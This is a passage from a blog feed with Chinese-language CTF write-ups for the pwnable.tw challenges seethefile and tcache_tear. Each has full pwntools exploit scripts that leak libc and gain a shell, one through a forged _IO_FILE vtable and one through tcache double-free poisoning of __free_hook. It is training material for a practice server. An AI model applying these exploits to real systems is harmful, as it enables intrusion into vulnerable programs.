times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x804b2b4</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *((struct _IO_jump_t*)0x804b2b4) # vtable_addr</span><br><span class="line">$2 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x0, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x804b2b4, </span><br><span class="line">  __close = 0xf7d80250 &lt;__libc_system&gt;, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./seethefile&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10200</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def open(filename):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendafter(&quot;see :&quot;, filename)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">menu(3)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line">def exit(name):</span><br><span class="line">menu(5)</span><br><span class="line">io.sendafter(&quot;name :&quot;, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"># payload = &apos;k&apos; * 0x20 + &quot;/home/seethefile/flag&quot;</span><br><span class="line">open(&quot;/proc/self/maps\n&quot;)</span><br><span class="line">read()</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line">io.recvuntil(&quot;\n&quot;)</span><br><span class="line">libc_base = int(&quot;0x&quot;+io.recv(8),16)</span><br><span class="line">sys_addr = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;sys_addr = &quot;+hex(sys_addr))</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">name_addr = 0x0804B260</span><br><span class="line">payload  = &quot;/bin/sh\x00&quot;</span><br><span class="line">payload  = payload.ljust(0x20, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr)# fake file addr</span><br><span class="line">payload  = payload.ljust(0x48, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr + 0x10)</span><br><span class="line">payload  = payload.ljust(0x94, &apos;\x00&apos;)</span><br><span class="line">payload += p32(name_addr+0x98-0x44)</span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line"></span><br><span class="line">exit(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 1)</span><br></pre></td></tr></table></figure><p>并不能直接得到flag</p><p>需要运行<code>get_flag</code>，源码也给惹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int read_input(char *buf,unsigned int size)&#123;</span><br><span class="line">    int ret ;</span><br><span class="line">    ret = read(0,buf,size);</span><br><span class="line">    if(ret &lt;= 0)&#123;</span><br><span class="line">        puts(&quot;read error&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if(buf[ret-1] == &apos;\n&apos;)</span><br><span class="line">        buf[ret-1] = &apos;\x00&apos;;</span><br><span class="line">    return ret ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    setvbuf(stdin,0,2,0);</span><br><span class="line">    setvbuf(stdout,0,2,0);</span><br><span class="line">    printf(&quot;Your magic :&quot;);</span><br><span class="line">    read_input(buf,40);</span><br><span class="line">    if(strcmp(buf,&quot;Give me the flag&quot;))&#123;</span><br><span class="line">        puts(&quot;GG !&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *fp = fopen(&quot;/home/seethefile/flag&quot;,&quot;r&quot;);</span><br><span class="line">    if(!fp)&#123;</span><br><span class="line">        puts(&quot;Open failed !&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,1,40,fp);</span><br><span class="line">    printf(&quot;Here is your flag: %s \n&quot;,buf);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入<code>Give me the flag</code>即可</p><blockquote><p>参考：<a href="https://www.jianshu.com/p/2e00afb01606" target="_blank" rel="noopener">https://www.jianshu.com/p/2e00afb01606</a></p><p>[<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/]</a>(<a href="https://veritas501.space/2017/12/13/IO" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO</a> FILE 学习笔记/) 里面有一个FILE.py伪造结构体感觉很好ovo</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;seethefile&quot;&gt;&lt;a href=&quot;#seethefile&quot; class=&quot;headerlink&quot; title=&quot;seethefile&quot;&gt;&lt;/a&gt;seethefile&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw tcache_tear wp</title>
    <link href="p1Kk.github.io/2020/07/21/tw/tw%20tear/"/>
    <id>p1Kk.github.io/2020/07/21/tw/tw%20tear/</id>
    <published>2020-07-20T16:00:00.000Z</published>
    <updated>2020-07-21T10:34:00.314Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache-tear"><a href="#tcache-tear" class="headerlink" title="tcache_tear"></a>tcache_tear</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO# GOT表不可写</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>漏洞点在free处有一个很明显的uaf，还有在malloc中，存在越界</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/tearyuejie.png" alt></p><p>设想构造unsorted bin，free后打印出fd减去偏移得到libc基址。</p><ol><li><p>构造unsorted bin，tcache链表是有空间限制的，但是题目中对free次数进行了限制，多次free填满tcache显然无法实现。所以可以通过伪造fake size，构造一个fake unsorted bin，同时要设置好后一个chunk的inuse位等通过检测。</p><p>根据tcache的特性，可以不使用上面的溢出漏洞，使用下面的方式构造fake chunk。</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x30,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0x30,addr)</span><br><span class="line">malloc(0x30,&quot;a&quot;*8)</span><br><span class="line">malloc(0x30,fake_data)</span><br></pre></td></tr></table></figure><ol start="2"><li>得到libc，改free_hook为one或sys即可…</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./tcache_tear&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10207</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">name_addr = 0x602060</span><br><span class="line">ptr_addr = 0x602088</span><br><span class="line">puts_plt = elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;] </span><br><span class="line">success(puts_got)</span><br><span class="line">def name(name):</span><br><span class="line">io.sendafter(&quot;Name:&quot;, name)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice :&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def malloc(size, data):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;Size:&quot;, str(size))</span><br><span class="line">io.sendafter(&quot;Data:&quot;, data)</span><br><span class="line"></span><br><span class="line">def free():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def info():</span><br><span class="line">menu(3)</span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&apos;libc.so&apos;)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"># 使用溢出漏洞</span><br><span class="line"># name(&quot;/bin/sh\x00&quot;)</span><br><span class="line">name(&apos;kk&apos;)# fake unsorted bin</span><br><span class="line">malloc(0xf, &quot;d&quot;*0x10)</span><br><span class="line">free()</span><br><span class="line">malloc(0x60, &quot;e&quot;*8)</span><br><span class="line">free()</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">malloc(0xf, &quot;a&quot;*0x20+p64(name_addr-0x10+0x510))</span><br><span class="line">malloc(0x60,p64(0)+p64(0x11))</span><br><span class="line">malloc(0x60,p64(0)+p64(0x11))</span><br><span class="line"></span><br><span class="line">##################################</span><br><span class="line"></span><br><span class="line">malloc(0xf, &quot;a&quot;*0x10)</span><br><span class="line">free()</span><br><span class="line">malloc(0x50, &quot;b&quot;*8)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0xf, &quot;c&quot;*0x20+p64(name_addr-0x10))</span><br><span class="line">malloc(0x50,p64(0)+p64(0x511))</span><br><span class="line">malloc(0x50,p64(0)+p64(0x511))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">free()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">name(&quot;kk&quot;)</span><br><span class="line">malloc(0x70,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">malloc(0x70,p64(name_addr-0x10+0x510))</span><br><span class="line">malloc(0x70,&quot;a&quot;*8)</span><br><span class="line">malloc(0x70,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21))</span><br><span class="line"></span><br><span class="line">malloc(0x60,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(0x60,p64(name_addr-0x10))</span><br><span class="line">malloc(0x60,&quot;a&quot;*8)</span><br><span class="line">malloc(0x60,p64(0)+p64(0x511)+p64(0)*5+p64(name_addr))</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">io.recvuntil(&quot;Name :&quot;)</span><br><span class="line">libc_base = u64(io.recv(8)) - 0x3ebca0</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">sys_addr=libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">malloc(0x40,&quot;a&quot;*8)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">malloc(0x40,p64(free_hook))</span><br><span class="line">malloc(0x40,&quot;a&quot;*8)</span><br><span class="line">malloc(0x40,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">malloc(0x18,&quot;/bin/sh\x00&quot;)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 0)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tcache-tear&quot;&gt;&lt;a href=&quot;#tcache-tear&quot; class=&quot;headerlink&quot; title=&quot;tcache_tear&quot;&gt;&lt;/a&gt;tcache_tear&lt;/h1&gt;&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;head</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
</feed>
